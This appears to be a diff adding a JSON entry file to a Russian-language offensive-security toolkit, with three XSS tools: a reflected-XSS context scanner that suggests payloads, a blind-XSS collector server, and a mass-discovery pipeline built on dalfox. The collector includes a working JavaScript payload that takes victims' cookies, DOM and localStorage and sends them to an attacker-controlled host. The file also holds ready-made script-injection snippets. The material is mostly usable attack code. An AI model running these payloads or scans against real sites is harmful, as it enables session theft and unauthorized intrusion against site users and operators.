@@ -1,0 +1,56 @@
+{
+  "category": "XSS",
+  "group": "exploit",
+  "catOrder": 18,
+  "entries": [
+    {
+      "title": "Reflected XSS scanner (context detection, no payload execution)",
+      "lang": "python",
+      "tags": [
+        "xss",
+        "reflected",
+        "scanner",
+        "context"
+      ],
+      "rating": "must",
+      "deps": "pip install requests",
+      "placeholders": "{{URL}} (с параметрами) · {{PARAM}}",
+      "source": "https://portswigger.net/web-security/cross-site-scripting",
+      "license": "GPL-3.0 (оригинал)",
+      "body": "Ищет reflected XSS, не выполняя при этом ни одного payload (безопасно гонять по чужому скоупу). Логика: на каждый параметр шлёт **уникальный маркер** из безобидных символов, находит его в ответе, определяет **контекст отражения** (HTML-текст, значение атрибута, внутри тега script, JS-строка, URL-атрибут, HTML-комментарий) и затем проверяет, какие **символы-брейкеры** контекста (`<`, `>`, `\"`, `'`, `` ` ``, `=`, `/`) проходят неэкранированными. На выходе - готовый под этот контекст proof-of-concept payload, но он НЕ отправляется и НЕ исполняется.\n\n> Сканер не триггерит alert и не грузит внешние ресурсы - только отражает маркеры и смотрит на экранирование. Финальный PoC из колонки `suggest` вставляешь вручную, осознанно. Работает по GET-параметрам из URL.\n\n```python\n#!/usr/bin/env python3\n# xss_reflect_scan.py - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.\nimport argparse, html, re, secrets\nfrom urllib.parse import urlparse, parse_qs, urlencode, urlunparse\nimport requests\nrequests.packages.urllib3.disable_warnings()\n\n# characters that, if reflected raw, let you break each context\nBREAKERS = [\"<\", \">\", '\"', \"'\", \"`\", \"=\", \"/\", \"(\", \")\", \";\"]\n\ndef classify(body, marker):\n    \"\"\"Return a coarse reflection context around the marker.\"\"\"\n    i = body.find(marker)\n    if i < 0:\n        return None\n    pre = body[max(0, i - 120):i]\n    # crude but effective context heuristics\n    if re.search(r\"<script[^>]*>(?:(?!</script>).)*$\", pre, re.I | re.S):\n        return \"js\" if re.search(r\"['\\\"`][^'\\\"`]*$\", pre) else \"script-block\"\n    if re.search(r\"<[^>]*=\\s*['\\\"]?[^'\\\">]*$\", pre):\n        return \"attribute\"\n    if re.search(r\"<!--[^>]*$\", pre):\n        return \"comment\"\n    return \"html\"\n\nSUGGEST = {\n    \"html\":        '<svg onload=alert(1)>',\n    \"attribute\":   '\"><svg onload=alert(1)>',\n    \"script-block\": '</script><svg onload=alert(1)>',\n    \"js\":          \"';alert(1);//\",\n    \"comment\":     '--><svg onload=alert(1)>',\n}\n\ndef reflect_raw(body, marker, ch):\n    \"\"\"True if `ch` is reflected un-encoded right next to a marker probe.\"\"\"\n    probe = marker + ch + marker\n    return probe in body  # raw, not html-escaped\n\ndef scan_param(s, url, qs, param):\n    marker = \"ars\" + secrets.token_hex(3)\n    # 1) plain reflection + context\n    q = dict(qs); q[param] = [marker]\n    u = urlparse(url)._replace(query=urlencode(q, doseq=True))\n    body = s.get(urlunparse(u), verify=False, timeout=20).text\n    ctx = classify(body, marker)\n    if ctx is None:\n        return\n    # 2) which breakers survive un-encoded\n    survived = []\n    for ch in BREAKERS:\n        q[param] = [marker + ch + marker]\n        u = urlparse(url)._replace(query=urlencode(q, doseq=True))\n        b = s.get(urlunparse(u), verify=False, timeout=20).text\n        if reflect_raw(b, marker, ch) and html.escape(ch) not in (marker + ch + marker):\n            survived.append(ch)\n    flag = \"VULN\" if any(c in survived for c in (\"<\", '\"', \"'\")) else \"reflected\"\n    print(f\"[{flag}] param={param} context={ctx} raw_breakers={''.join(survived) or '-'}\")\n    if flag == \"VULN\":\n        print(f\"        suggest: {SUGGEST.get(ctx, SUGGEST['html'])}\")\n\ndef main():\n    ap = argparse.ArgumentParser(description=\"ARS3NAL reflected-XSS context scanner (no exec)\")\n    ap.add_argument(\"-u\", \"--url\", required=True, help=\"URL including query parameters\")\n    a = ap.parse_args()\n    s = requests.Session(); s.headers[\"User-Agent\"] = \"ARS3NAL-XSS/1.0\"\n    qs = {k: v for k, v in parse_qs(urlparse(a.url).query).items()}\n    if not qs:\n        print(\"[-] no query parameters in URL\"); return\n    for param in qs:\n        scan_param(s, a.url, qs, param)\n\nif __name__ == \"__main__\":\n    main()\n```\n\nЗапуск:\n```bash\npython3 xss_reflect_scan.py -u \"https://target/search?q=test&lang=en\"\n```"
+    },
+    {
+      "title": "Blind XSS collector server (offline, JSONL)",
+      "lang": "python",
+      "tags": [
+        "xss",
+        "blind",
+        "collector",
+        "exfil",
+        "offline"
+      ],
+      "rating": "must",
+      "deps": "stdlib only (http.server)",
+      "placeholders": "{{LHOST}} · {{LPORT}}",
+      "source": "https://portswigger.net/web-security/cross-site-scripting/exploiting",
+      "license": "GPL-3.0 (оригинал)",
+      "body": "Полностью **офлайновый** приёмник для blind XSS (когда payload срабатывает не у тебя, а в админке/тикет-системе позже). Поднимает локальный HTTP-сервер, который принимает эксфильтрованные данные (cookie, кусок DOM, localStorage, URL, referrer, User-Agent) и пишет каждый прилёт строкой в **JSONL**-лог с таймстампом. Никаких внешних сервисов - всё крутится у тебя. В комплекте генератор inline-payload, который собирает эти данные на стороне жертвы и шлёт их сюда `fetch`-ом или картинкой.\n\n> Это замена платным Burp Collaborator / xss.report для офлайн-работы. Отдавай `/p.js` как внешний скрипт (`<script src=//{{LHOST}}:{{LPORT}}/p.js>`) либо вставляй inline-сниппет из `--print-payload`. Лог пишется в `blindxss.jsonl` рядом со скриптом.\n\n```python\n#!/usr/bin/env python3\n# blindxss_server.py - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.\nimport argparse, json, time\nfrom http.server import BaseHTTPRequestHandler, ThreadingHTTPServer\nfrom urllib.parse import urlparse, parse_qs\n\nLOG = \"blindxss.jsonl\"\n\n# served at /p.js - collects context and beacons it back (cookie may be httpOnly -> empty)\nPAYLOAD_JS = \"\"\"(function(){try{\n var d={cookie:document.cookie,dom:document.documentElement.outerHTML.slice(0,4000),\n  url:location.href,ref:document.referrer,\n  ls:JSON.stringify(window.localStorage),origin:location.origin};\n navigator.sendBeacon('/c',JSON.stringify(d))||\n  fetch('/c',{method:'POST',body:JSON.stringify(d),mode:'no-cors'});\n}catch(e){new Image().src='/c?e='+encodeURIComponent(e);}})();\"\"\"\n\nclass H(BaseHTTPRequestHandler):\n    def _log(self, kind, data):\n        rec = {\"ts\": time.strftime(\"%Y-%m-%dT%H:%M:%S\"), \"kind\": kind,\n               \"ip\": self.client_address[0], \"ua\": self.headers.get(\"User-Agent\", \"\"),\n               \"data\": data}\n        with open(LOG, \"a\", encoding=\"utf-8\") as f:\n            f.write(json.dumps(rec, ensure_ascii=False) + \"\\n\")\n        print(f\"[!] HIT {kind} from {rec['ip']}\")\n\n    def do_GET(self):\n        p = urlparse(self.path)\n        if p.path == \"/p.js\":\n            self.send_response(200); self.send_header(\"Content-Type\", \"application/javascript\")\n            self.send_header(\"Access-Control-Allow-Origin\", \"*\"); self.end_headers()\n            self.wfile.write(PAYLOAD_JS.encode()); return\n        if p.path == \"/c\":\n            self._log(\"img\", parse_qs(p.query))\n        self.send_response(200); self.send_header(\"Content-Type\", \"image/gif\"); self.end_headers()\n        self.wfile.write(b\"GIF89a\")\n\n    def do_POST(self):\n        n = int(self.headers.get(\"Content-Length\", 0) or 0)\n        raw = self.rfile.read(n).decode(\"utf-8\", \"replace\")\n        try:\n            data = json.loads(raw)\n        except ValueError:\n            data = {\"raw\": raw}\n        self._log(\"beacon\", data)\n        self.send_response(204); self.send_header(\"Access-Control-Allow-Origin\", \"*\"); self.end_headers()\n\n    def log_message(self, *a):\n        pass\n\ndef main():\n    ap = argparse.ArgumentParser(description=\"ARS3NAL offline blind-XSS collector\")\n    ap.add_argument(\"--host\", default=\"0.0.0.0\")\n    ap.add_argument(\"--port\", type=int, default=8888)\n    ap.add_argument(\"--print-payload\", action=\"store_true\")\n    a = ap.parse_args()\n    if a.print_payload:\n        print(f'<script src=//{{{{LHOST}}}}:{a.port}/p.js></script>')\n        print(f'\"><script src=//{{{{LHOST}}}}:{a.port}/p.js></script>')\n        return\n    print(f\"[*] listening on {a.host}:{a.port}  log -> {LOG}\")\n    ThreadingHTTPServer((a.host, a.port), H).serve_forever()\n\nif __name__ == \"__main__\":\n    main()\n```\n\nЗапуск:\n```bash\npython3 blindxss_server.py --port 8888\npython3 blindxss_server.py --print-payload --port 8888   # выводит сниппеты для вставки\n```"
+    },
+    {
+      "title": "XSS discovery pipeline (gau -> gf -> uro -> Gxss -> kxss -> dalfox)",
+      "lang": "bash",
+      "tags": [
+        "xss",
+        "recon",
+        "pipeline",
+        "automation"
+      ],
+      "rating": "nice",
+      "deps": "go install: gau, gf, uro, Gxss, kxss, dalfox (см. репозитории авторов)",
+      "placeholders": "{{TARGET}} (домен)",
+      "source": "https://github.com/hahwul/dalfox",
+      "license": "обёртка GPL-3.0; тулзы - сторонние, ставятся отдельно",
+      "body": "Конвейер для массового поиска отражённых параметров на bug-bounty-цели: собрать URL, отфильтровать XSS-кандидаты, дедуплицировать, проверить отражение, затем точечно прогнать dalfox. Сами утилиты - сторонние (ссылки в `deps`), здесь только оркестрация-обёртка.\n\n> Каждая тулза ставится отдельно (`go install`). dalfox (hahwul) - внешний сканер, мы его не вендорим, только вызываем. Гоняй ТОЛЬКО по доменам в своём скоупе.\n\n```bash\n#!/usr/bin/env bash\n# xss_pipeline.sh - ARS3NAL (GPL-3.0) orchestration wrapper. AUTHORIZED targets only.\nset -euo pipefail\nTARGET=\"${1:?usage: xss_pipeline.sh example.com}\"\nOUT=\"xss_${TARGET}\"; mkdir -p \"$OUT\"\n\necho \"[*] 1. collecting URLs (gau)\"\ngau \"$TARGET\" > \"$OUT/all.txt\" || true\n\necho \"[*] 2. keep XSS-candidate params (gf) + dedup (uro)\"\ngf xss < \"$OUT/all.txt\" | uro > \"$OUT/candidates.txt\"\n\necho \"[*] 3. confirm reflection (Gxss + kxss)\"\nGxss -c 50 < \"$OUT/candidates.txt\" | sort -u > \"$OUT/reflected.txt\"\nkxss < \"$OUT/candidates.txt\" | tee \"$OUT/kxss.txt\"\n\necho \"[*] 4. targeted scan (dalfox)\"\ndalfox file \"$OUT/reflected.txt\" --no-spinner --silence -o \"$OUT/dalfox.txt\"\n\necho \"[=] done -> $OUT/dalfox.txt\"\n```\n\nЗапуск:\n```bash\nbash xss_pipeline.sh target.example.com\n```"
+    }
+  ]
+}
